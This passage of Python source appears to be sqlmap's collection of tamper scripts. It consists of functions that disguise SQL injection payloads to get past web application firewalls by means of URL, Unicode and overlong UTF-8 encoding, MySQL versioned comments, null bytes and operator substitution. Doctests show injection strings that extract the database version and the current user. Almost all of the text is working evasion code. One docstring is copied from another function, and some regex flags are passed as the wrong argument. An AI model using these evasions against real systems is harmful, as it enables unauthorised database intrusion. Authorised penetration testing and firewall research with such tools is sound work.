        """
        Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart
        Tested against:
            * Microsoft SQL Server 2012
        Requirements:
            * Microsoft SQL Server 2012+
        Notes:
            * Useful in case ('+') character is filtered
        >>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')
        'SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL'
        >>> tamper('1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe')
        '1 UNION ALL SELECT NULL,NULL,CONCAT(CHAR(113),CHAR(118),CHAR(112),CHAR(112),CHAR(113),ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)),CHAR(113),CHAR(112),CHAR(107),CHAR(112),CHAR(113))-- qtfe'
        """

        retVal = payload

        if payload:
            match = re.search(r"('[^']+'|CHAR\(\d+\))\+.*(?<=\+)('[^']+'|CHAR\(\d+\))", retVal)
            if match:
                part = match.group(0)

                chars = [char for char in part]
                for index in self.zeroDepthSearch(part, '+'):
                    chars[index] = ','

                replacement = "CONCAT(%s)" % "".join(chars)
                retVal = retVal.replace(part, replacement)

        return retVal

    def percentage(self, payload, **kwargs):
        """
        Adds a percentage sign ('%') infront of each character (e.g. SELECT -> %S%E%L%E%C%T)
        Requirement:
            * ASP
        Tested against:
            * Microsoft SQL Server 2000, 2005
            * MySQL 5.1.56, 5.5.11
            * PostgreSQL 9.0
        Notes:
            * Useful to bypass weak and bespoke web application firewalls
        >>> tamper('SELECT FIELD FROM TABLE')
        '%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E'
        """
        retVal = ""
        if payload:
            i = 0
            while i < len(payload):
                if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                    retVal += payload[i:i + 3]
                    i += 3
                elif payload[i] != ' ':
                    retVal += '%%%s' % payload[i]
                    i += 1
                else:
                    retVal += payload[i]
                    i += 1

        return retVal

    def overlongutf8more(self, payload, **kwargs):
        """
        Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)
        Reference:
            * https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/
            * https://www.thecodingforums.com/threads/newbie-question-about-character-encoding-what-does-0xc0-0x8a-have-in-common-with-0xe0-0x80-0x8a.170201/
        >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')
        '%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94%C0%A0%C1%86%C1%89%C1%85%C1%8C%C1%84%C0%A0%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%94%C1%81%C1%82%C1%8C%C1%85%C0%A0%C1%97%C1%88%C1%85%C1%92%C1%85%C0%A0%C0%B2%C0%BE%C0%B1'
        """

        retVal = payload

        if payload:
            retVal = ""
            i = 0

            while i < len(payload):
                if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                    retVal += payload[i:i + 3]
                    i += 3
                else:
                    retVal += "%%%.2X%%%.2X" % (0xc0 + (ord(payload[i]) >> 6), 0x80 + (ord(payload[i]) & 0x3f))
                    i += 1

        return retVal

    def overlongutf8(self, payload, **kwargs):
        """
        Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. ' -> %C0%A7)
        Reference:
            * https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/
            * https://www.thecodingforums.com/threads/newbie-question-about-character-encoding-what-does-0xc0-0x8a-have-in-common-with-0xe0-0x80-0x8a.170201/
        >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')
        'SELECT%C0%A0FIELD%C0%A0FROM%C0%A0TABLE%C0%A0WHERE%C0%A02%C0%BE1'
        """

        retVal = payload

        if payload:
            retVal = ""
            i = 0

            while i < len(payload):
                if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                    retVal += payload[i:i + 3]
                    i += 3
                else:
                    if payload[i] not in (string.ascii_letters + string.digits):
                        retVal += "%%%.2X%%%.2X" % (0xc0 + (ord(payload[i]) >> 6), 0x80 + (ord(payload[i]) & 0x3f))
                    else:
                        retVal += payload[i]
                    i += 1

        return retVal

    def multiplespaces(self, payload, **kwargs):
        """
        Adds multiple spaces (' ') around SQL keywords
        Notes:
            * Useful to bypass very weak and bespoke web application firewalls
            that has poorly written permissive regular expressions
        Reference: https://www.owasp.org/images/7/74/Advanced_SQL_Injection.ppt
        >>> random.seed(0)
        >>> tamper('1 UNION SELECT foobar')
        '1     UNION     SELECT     foobar'
        """

        retVal = payload

        if payload:
            words = OrderedSet()

            for match in re.finditer(r"\b[A-Za-z_]+\b", payload):
                word = match.group()

                if word.upper() in self.keywords:
                    words.add(word)

            for word in words:
                retVal = re.sub(r"(?<=\W)%s(?=[^A-Za-z_(]|\Z)" % word, "%s%s%s" % (' ' * random.randint(1, 4), word, ' ' * random.randint(1, 4)), retVal)
                retVal = re.sub(r"(?<=\W)%s(?=[(])" % word, "%s%s" % (' ' * random.randint(1, 4), word), retVal)

        return retVal

    def modsecurityzeroversioned(self, payload, **kwargs):
        """
        Embraces complete query with (MySQL) zero-versioned comment
        Requirement:
            * MySQL
        Tested against:
            * MySQL 5.0
        Notes:
            * Useful to bypass ModSecurity WAF
        >>> tamper('1 AND 2>1--')
        '1 /*!00000AND 2>1*/--'
        """

        retVal = payload

        if payload:
            postfix = ''
            for comment in ('#', '--', '/*'):
                if comment in payload:
                    postfix = payload[payload.find(comment):]
                    payload = payload[:payload.find(comment)]
                    break
            if ' ' in payload:
                retVal = "%s /*!00000%s*/%s" % (payload[:payload.find(' ')], payload[payload.find(' ') + 1:], postfix)

        return retVal

    def modsecurityversioned(self, payload, **kwargs):
        """
        Embraces complete query with (MySQL) versioned comment
        Requirement:
            * MySQL
        Tested against:
            * MySQL 5.0
        Notes:
            * Useful to bypass ModSecurity WAF
        >>> import random
        >>> random.seed(0)
        >>> tamper('1 AND 2>1--')
        '1 /*!30963AND 2>1*/--'
        """

        retVal = payload

        if payload:
            postfix = ''
            for comment in ('#', '--', '/*'):
                if comment in payload:
                    postfix = payload[payload.find(comment):]
                    payload = payload[:payload.find(comment)]
                    break
            if ' ' in payload:
                retVal = "%s /*!30%s%s*/%s" % (payload[:payload.find(' ')], self.randomInt(3), payload[payload.find(' ') + 1:], postfix)

        return retVal

    def lowercase(self, payload, **kwargs):
        """
        Replaces each keyword character with lower case value (e.g. SELECT -> select)
        Tested against:
            * Microsoft SQL Server 2005
            * MySQL 4, 5.0 and 5.5
            * Oracle 10g
            * PostgreSQL 8.3, 8.4, 9.0
        Notes:
            * Useful to bypass very weak and bespoke web application firewalls
            that has poorly written permissive regular expressions
        >>> tamper('INSERT')
        'insert'
        """

        retVal = payload

        if payload:
            for match in re.finditer(r"\b[A-Za-z_]+\b", retVal):
                word = match.group()

                if word.upper() in self.keywords:
                    retVal = retVal.replace(word, word.lower())

        return retVal

    def least(self, payload, **kwargs):
        """
        Replaces greater than operator ('>') with 'LEAST' counterpart
        Tested against:
            * MySQL 4, 5.0 and 5.5
            * Oracle 10g
            * PostgreSQL 8.3, 8.4, 9.0
        Notes:
            * Useful to bypass weak and bespoke web application firewalls that
            filter the greater than character
            * The LEAST clause is a widespread SQL command. Hence, this
            tamper script should work against majority of databases
        >>> tamper('1 AND A > B')
        '1 AND LEAST(A,B+1)=B+1'
        """

        retVal = payload

        if payload:
            match = re.search(r"(?i)(\b(AND|OR)\b\s+)([^>]+?)\s*>\s*(\w+|'[^']+')", payload)

            if match:
                _ = "%sLEAST(%s,%s+1)=%s+1" % (match.group(1), match.group(3), match.group(4), match.group(4))
                retVal = retVal.replace(match.group(0), _)

        return retVal

    def informationschemacomment(self, payload, **kwargs):
        """
        Add an inline comment (/**/) to the end of all occurrences of (MySQL) "information_schema" identifier
        >>> tamper('SELECT table_name FROM INFORMATION_SCHEMA.TABLES')
        'SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES'
        """

        retVal = payload

        if payload:
            retVal = re.sub(r"(?i)(information_schema)\.", r"\g<1>/**/.", payload)

        return retVal

    def ifnull2ifisnull(self, payload, **kwargs):
        """
        Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' counterpart
        Requirement:
            * MySQL
            * SQLite (possibly)
            * SAP MaxDB (possibly)
        Tested against:
            * MySQL 5.0 and 5.5
        Notes:
            * Useful to bypass very weak and bespoke web application firewalls
            that filter the IFNULL() function
        >>> tamper('IFNULL(1, 2)')
        'IF(ISNULL(1),2,1)'
        """

        if payload and payload.find("IFNULL") > -1:
            while payload.find("IFNULL(") > -1:
                index = payload.find("IFNULL(")
                depth = 1
                comma, end = None, None

                for i in xrange(index + len("IFNULL("), len(payload)):
                    if depth == 1 and payload[i] == ',':
                        comma = i

                    elif depth == 1 and payload[i] == ')':
                        end = i
                        break

                    elif payload[i] == '(':
                        depth += 1

                    elif payload[i] == ')':
                        depth -= 1

                if comma and end:
                    _ = payload[index + len("IFNULL("):comma]
                    __ = payload[comma + 1:end].lstrip()
                    newVal = "IF(ISNULL(%s),%s,%s)" % (_, __, _)
                    payload = payload[:index] + newVal + payload[end + 1:]
                else:
                    break

        return payload

    def ifnull2casewhenisnull(self, payload, **kwargs):
        """
        Replaces instances like 'IFNULL(A, B)' with 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' counterpart
        Requirement:
            * MySQL
            * SQLite (possibly)
            * SAP MaxDB (possibly)
        Tested against:
            * MySQL 5.0 and 5.5
        Notes:
            * Useful to bypass very weak and bespoke web application firewalls
            that filter the IFNULL() functions
        >>> tamper('IFNULL(1, 2)')
        'CASE WHEN ISNULL(1) THEN (2) ELSE (1) END'
        """

        if payload and payload.find("IFNULL") > -1:
            while payload.find("IFNULL(") > -1:
                index = payload.find("IFNULL(")
                depth = 1
                comma, end = None, None

                for i in xrange(index + len("IFNULL("), len(payload)):
                    if depth == 1 and payload[i] == ',':
                        comma = i

                    elif depth == 1 and payload[i] == ')':
                        end = i
                        break

                    elif payload[i] == '(':
                        depth += 1

                    elif payload[i] == ')':
                        depth -= 1

                if comma and end:
                    _ = payload[index + len("IFNULL("):comma]
                    __ = payload[comma + 1:end].lstrip()
                    newVal = "CASE WHEN ISNULL(%s) THEN (%s) ELSE (%s) END" % (_, __, _)
                    payload = payload[:index] + newVal + payload[end + 1:]
                else:
                    break

        return payload

    def htmlencode(self, payload, **kwargs):
        """
        HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> &#39;)
        >>> tamper("1' AND SLEEP(5)#")
        '1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;'
        """

        return re.sub(r"[^\w]", lambda match: "&#%d;" % ord(match.group(0)), payload) if payload else payload

    def hex2char(self, payload, **kwargs):
        """
        Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),...) counterpart
        Requirement:
            * MySQL
        Tested against:
            * MySQL 4, 5.0 and 5.5
        Notes:
            * Useful in cases when web application does the upper casing
        >>> tamper('SELECT 0xdeadbeef')
        'SELECT CONCAT(CHAR(222),CHAR(173),CHAR(190),CHAR(239))'
        """

        retVal = payload

        if payload:
            for match in re.finditer(r"\b0x([0-9a-f]+)\b", retVal):
                if len(match.group(1)) > 2:
                    result = "CONCAT(%s)" % ','.join("CHAR(%d)" % _ for _ in self.getOrds(self.decodeHex(match.group(1))))
                else:
                    result = "CHAR(%d)" % ord(self.decodeHex(match.group(1)))
                retVal = retVal.replace(match.group(0), result)

        return retVal

    def halfversionedmorekeywords(self, payload, **kwargs):
        """
        Adds (MySQL) versioned comment before each keyword
        Requirement:
            * MySQL < 5.1
        Tested against:
            * MySQL 4.0.18, 5.0.22
        Notes:
            * Useful to bypass several web application firewalls when the
            back-end database management system is MySQL
            * Used during the ModSecurity SQL injection challenge,
            http://modsecurity.org/demo/challenge.html
        >>> tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")
        "value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"
        """

        def process(match):
            word = match.group('word')
            if word.upper() in self.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
                return match.group().replace(word, "/*!0%s" % word)
            else:
                return match.group()

        retVal = payload

        if payload:
            retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", process, retVal)
            retVal = retVal.replace(" /*!0", "/*!0")

        return retVal

    def greatest(self, payload, **kwargs):
        """
        Replaces greater than operator ('>') with 'GREATEST' counterpart
        Tested against:
            * MySQL 4, 5.0 and 5.5
            * Oracle 10g
            * PostgreSQL 8.3, 8.4, 9.0
        Notes:
            * Useful to bypass weak and bespoke web application firewalls that
            filter the greater than character
            * The GREATEST clause is a widespread SQL command. Hence, this
            tamper script should work against majority of databases
        >>> tamper('1 AND A > B')
        '1 AND GREATEST(A,B+1)=A'
        """

        retVal = payload

        if payload:
            match = re.search(r"(?i)(\b(AND|OR)\b\s+)([^>]+?)\s*>\s*(\w+|'[^']+')", payload)

            if match:
                _ = "%sGREATEST(%s,%s+1)=%s" % (match.group(1), match.group(3), match.group(4), match.group(3))
                retVal = retVal.replace(match.group(0), _)

        return retVal

    def escapequotes(self, payload, **kwargs):
        """
        Slash escape single and double quotes (e.g. ' -> \')
        >>> tamper('1" AND SLEEP(5)#')
        '1\\\\" AND SLEEP(5)#'
        """

        return payload.replace("'", "\\'").replace('"', '\\"')

    def equaltolike(self, payload, **kwargs):
        """
        Replaces all occurrences of operator equal ('=') with 'LIKE' counterpart
        Tested against:
            * Microsoft SQL Server 2005
            * MySQL 4, 5.0 and 5.5
        Notes:
            * Useful to bypass weak and bespoke web application firewalls that
            filter the equal character ('=')
            * The LIKE operator is SQL standard. Hence, this tamper script
            should work against all (?) databases
        >>> tamper('SELECT * FROM users WHERE id=1')
        'SELECT * FROM users WHERE id LIKE 1'
        """

        retVal = payload

        if payload:
            retVal = re.sub(r"\s*=\s*", " LIKE ", retVal)

        return retVal

    def concat2concatws(self, payload, **kwargs):
        """
        Replaces (MySQL) instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' counterpart
        Requirement:
            * MySQL
        Tested against:
            * MySQL 5.0
        Notes:
            * Useful to bypass very weak and bespoke web application firewalls
            that filter the CONCAT() function
        >>> tamper('CONCAT(1,2)')
        'CONCAT_WS(MID(CHAR(0),0,0),1,2)'
        """

        if payload:
            payload = payload.replace("CONCAT(", "CONCAT_WS(MID(CHAR(0),0,0),")

        return payload

    def commentbeforeparentheses(self, payload, **kwargs):
        """
        Prepends (inline) comment before parentheses (e.g. ( -> /**/()
        Tested against:
            * Microsoft SQL Server
            * MySQL
            * Oracle
            * PostgreSQL
        Notes:
            * Useful to bypass web application firewalls that block usage
            of function calls
        >>> tamper('SELECT ABS(1)')
        'SELECT ABS/**/(1)'
        """

        retVal = payload

        if payload:
            retVal = re.sub(r"\b(\w+)\(", r"\g<1>/**/(", retVal)

        return retVal

    def commalessmid(self, payload, **kwargs):
        """
        Replaces (MySQL) instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' counterpart
        you should consider usage of switch '--no-cast' along with tamper script 'commalessmid'
        Requirement:
            * MySQL
        Tested against:
            * MySQL 5.0 and 5.5
        >>> tamper('MID(VERSION(), 1, 1)')
        'MID(VERSION() FROM 1 FOR 1)'
        """

        retVal = payload

        match = re.search(r"(?i)MID\((.+?)\s*,\s*(\d+)\s*\,\s*(\d+)\s*\)", payload or "")
        if match:
            retVal = retVal.replace(match.group(0), "MID(%s FROM %s FOR %s)" % (match.group(1), match.group(2), match.group(3)))

        return retVal

    def commalesslimit(self, payload, **kwargs):
        """
        Replaces (MySQL) instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' counterpart
        Requirement:
            * MySQL
        Tested against:
            * MySQL 5.0 and 5.5
        >>> tamper('LIMIT 2, 3')
        'LIMIT 3 OFFSET 2'
        """

        retVal = payload

        match = re.search(r"(?i)LIMIT\s*(\d+),\s*(\d+)", payload or "")
        if match:
            retVal = retVal.replace(match.group(0), "LIMIT %s OFFSET %s" % (match.group(2), match.group(1)))

        return retVal

    def charunicodeescape(self, payload, **kwargs):
        """
        Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054)
        Notes:
            * Useful to bypass weak filtering and/or WAFs in JSON contexes
        >>> tamper('SELECT FIELD FROM TABLE')
        '\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045'
        """

        retVal = payload

        if payload:
            retVal = ""
            i = 0

            while i < len(payload):
                if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                    retVal += "\\u00%s" % payload[i + 1:i + 3]
                    i += 3
                else:
                    retVal += '\\u%.4X' % ord(payload[i])
                    i += 1

        return retVal

    def charunicodeencode(self, payload, **kwargs):
        """
        Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)
        Requirement:
            * ASP
            * ASP.NET
        Tested against:
            * Microsoft SQL Server 2000
            * Microsoft SQL Server 2005
            * MySQL 5.1.56
            * PostgreSQL 9.0.3
        Notes:
            * Useful to bypass weak web application firewalls that do not unicode URL-decode the request before processing it through their ruleset
        >>> tamper('SELECT FIELD%20FROM TABLE')
        '%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045'
        """

        retVal = payload

        if payload:
            retVal = ""
            i = 0

            while i < len(payload):
                if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                    retVal += "%%u00%s" % payload[i + 1:i + 3]
                    i += 3
                else:
                    retVal += '%%u%.4X' % ord(payload[i])
                    i += 1

        return retVal

    def charencode(self, payload, **kwargs):
        """
        URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54)
        Tested against:
            * Microsoft SQL Server 2005
            * MySQL 4, 5.0 and 5.5
            * Oracle 10g
            * PostgreSQL 8.3, 8.4, 9.0
        Notes:
            * Useful to bypass very weak web application firewalls that do not url-decode the request before processing it through their ruleset
            * The web server will anyway pass the url-decoded version behind, hence it should work against any DBMS
        >>> tamper('SELECT FIELD FROM%20TABLE')
        '%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45'
        """

        retVal = payload

        if payload:
            retVal = ""
            i = 0

            while i < len(payload):
                if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                    retVal += payload[i:i + 3]
                    i += 3
                else:
                    retVal += '%%%.2X' % ord(payload[i])
                    i += 1

        return retVal

    def bluecoat(self, payload, **kwargs):
        """
        Replaces space character after SQL statement with a valid random blank character. Afterwards replace character '=' with operator LIKE
        Requirement:
            * Blue Coat SGOS with WAF activated as documented in
            https://kb.bluecoat.com/index?page=content&id=FAQ2147
        Tested against:
            * MySQL 5.1, SGOS
        Notes:
            * Useful to bypass Blue Coat's recommended WAF rule configuration
        >>> tamper('SELECT id FROM users WHERE id = 1')
        'SELECT%09id FROM%09users WHERE%09id LIKE 1'
        """

        def process(match):
            word = match.group('word')
            if word.upper() in self.keywords:
                return match.group().replace(word, "%s%%09" % word)
            else:
                return match.group()

        retVal = payload

        if payload:
            retVal = re.sub(r"\b(?P<word>[A-Z_]+)(?=[^\w(]|\Z)", process, retVal)
            retVal = re.sub(r"\s*=\s*", " LIKE ", retVal)
            retVal = retVal.replace("%09 ", "%09")

        return retVal

    def between(self, payload, **kwargs):
        """
        Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' and equals operator ('=') with 'BETWEEN # AND #'
        Tested against:
            * Microsoft SQL Server 2005
            * MySQL 4, 5.0 and 5.5
            * Oracle 10g
            * PostgreSQL 8.3, 8.4, 9.0
        Notes:
            * Useful to bypass weak and bespoke web application firewalls that
            filter the greater than character
            * The BETWEEN clause is SQL standard. Hence, this tamper script
            should work against all (?) databases
        >>> tamper('1 AND A > B--')
        '1 AND A NOT BETWEEN 0 AND B--'
        >>> tamper('1 AND A = B--')
        '1 AND A BETWEEN B AND B--'
        >>> tamper('1 AND LAST_INSERT_ROWID()=LAST_INSERT_ROWID()')
        '1 AND LAST_INSERT_ROWID() BETWEEN LAST_INSERT_ROWID() AND LAST_INSERT_ROWID()'
        """

        retVal = payload

        if payload:
            match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^>]+?)\s*>\s*([^>]+)\s*\Z", payload)

            if match:
                _ = "%s %s NOT BETWEEN 0 AND %s" % (match.group(2), match.group(4), match.group(5))
                retVal = retVal.replace(match.group(0), _)
            else:
                retVal = re.sub(r"\s*>\s*(\d+|'[^']+'|\w+\(\d+\))", r" NOT BETWEEN 0 AND \g<1>", payload)

            if retVal == payload:
                match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^=]+?)\s*=\s*([\w()]+)\s*", payload)

                if match:
                    _ = "%s %s BETWEEN %s AND %s" % (match.group(2), match.group(4), match.group(5), match.group(5))
                    retVal = retVal.replace(match.group(0), _)

        return retVal

    def appendnullbyte(self, payload, **kwargs):
        """
        Appends (Access) NULL byte character (%00) at the end of payload
        Requirement:
            * Microsoft Access
        Notes:
            * Useful to bypass weak web application firewalls when the back-end
            database management system is Microsoft Access - further uses are
            also possible
        Reference: http://projects.webappsec.org/w/page/13246949/Null-Byte-Injection
        >>> tamper('1 AND 1=1')
        '1 AND 1=1%00'
        """

        return "%s%%00" % payload if payload else payload

    def apostrophenullencode(self, payload, **kwargs):
        """
        Replaces apostrophe character (') with its illegal double unicode counterpart (e.g. ' -> %00%27)
        >>> tamper("1 AND '1'='1")
        '1 AND %00%271%00%27=%00%271'
        """

        return payload.replace('\'', "%00%27") if payload else payload

    def apostrophemask(self, payload, **kwargs):
        """
        Replaces apostrophe character (') with its UTF-8 full width counterpart (e.g. ' -> %EF%BC%87)
        References:
            * http://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&number=128
            * http://lukasz.pilorz.net/testy/unicode_conversion/
            * http://sla.ckers.org/forum/read.php?13,11562,11850
            * http://lukasz.pilorz.net/testy/full_width_utf/index.phps
        >>> tamper("1 AND '1'='1")
        '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'
        """

        return payload.replace('\'', "%EF%BC%87") if payload else payload

    def e0UNION(self, payload, **kwargs):
        """
        Replaces instances of <int> UNION with <int>e0UNION

        Requirement:
            * MySQL
            * MsSQL

        Notes:
            * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf

        >>> tamper('1 UNION ALL SELECT')
        '1e0UNION ALL SELECT'
        """

        return re.sub("(\d+)\s+(UNION )", r"\g<1>e0\g<2>", payload, re.I) if payload else payload

    def misunion(self, payload, **kwargs):
        """
        Replaces instances of UNION with -.1UNION

        Requirement:
            * MySQL

        Notes:
            * Reference: https://raw.githubusercontent.com/y0unge/Notes/master/SQL%20Injection%20WAF%20Bypassing%20shortcut.pdf

        >>> tamper('1 UNION ALL SELECT')
        '1-.1UNION ALL SELECT'
        >>> tamper('1" UNION ALL SELECT')
        '1"-.1UNION ALL SELECT'
        """

        return re.sub("\s+(UNION )", r"-.1\g<1>", payload, re.I) if payload else payload

    def schemasplit(self, payload, **kwargs):
        """
        Replaces instances of <int> UNION with <int>e0UNION

        Requirement:
            * MySQL

        Notes:
            * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf

        >>> tamper('SELECT id FROM testdb.users')
        'SELECT id FROM testdb 9.e.users'
        """

        return re.sub("( FROM \w+)\.(\w+)", r"\g<1> 9.e.\g<2>", payload, re.I) if payload else payload

    def binary(self, payload, **kwargs):
        """
        Injects keyword binary where possible

        Requirement:
            * MySQL

        >>> tamper('1 UNION ALL SELECT NULL, NULL, NULL')
        '1 UNION ALL SELECT binary NULL, binary NULL, binary NULL'
        >>> tamper('1 AND 2>1')
        '1 AND binary 2>binary 1'
        >>> tamper('CASE WHEN (1=1) THEN 1 ELSE 0x28 END')
        'CASE WHEN (binary 1=binary 1) THEN binary 1 ELSE binary 0x28 END'
        """

        retVal = payload

        if payload:
            retVal = re.sub(r"\bNULL\b", "binary NULL", retVal)
            retVal = re.sub(r"\b(THEN\s+)(\d+|0x[0-9a-f]+)(\s+ELSE\s+)(\d+|0x[0-9a-f]+)", r"\g<1>binary \g<2>\g<3>binary \g<4>", retVal)
            retVal = re.sub(r"(\d+\s*[>=]\s*)(\d+)", r"binary \g<1>binary \g<2>", retVal)
            retVal = re.sub(r"\b((AND|OR)\s*)(\d+)", r"\g<1>binary \g<3>", retVal)
            retVal = re.sub(r"([>=]\s*)(\d+)", r"\g<1>binary \g<2>", retVal)
            retVal = re.sub(r"\b(0x[0-9a-f]+)", r"binary \g<1>", retVal)
            retVal = re.sub(r"(\s+binary)+", r"\g<1>", retVal)

        return retVal

    def dunion(self, payload, **kwargs):
        """
        Replaces instances of <int> UNION with <int>DUNION

        Requirement:
            * Oracle

        Notes:
            * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf

        >>> tamper('1 UNION ALL SELECT')
        '1DUNION ALL SELECT'
        """

        return re.sub("(\d+)\s+(UNION )", r"\g<1>D\g<2>", payload, re.I) if payload else payload

    def equaltorlike(self, payload, **kwargs):
        """
        Replaces all occurrences of operator equal ('=') with 'RLIKE' counterpart

        Tested against:
            * MySQL 4, 5.0 and 5.5

        Notes:
            * Useful to bypass weak and bespoke web application firewalls that
            filter the equal character ('=')

        >>> tamper('SELECT * FROM users WHERE id=1')
        'SELECT * FROM users WHERE id RLIKE 1'
        """

        retVal = payload

        if payload:
            retVal = re.sub(r"\s*=\s*", " RLIKE ", retVal)

        return retVal
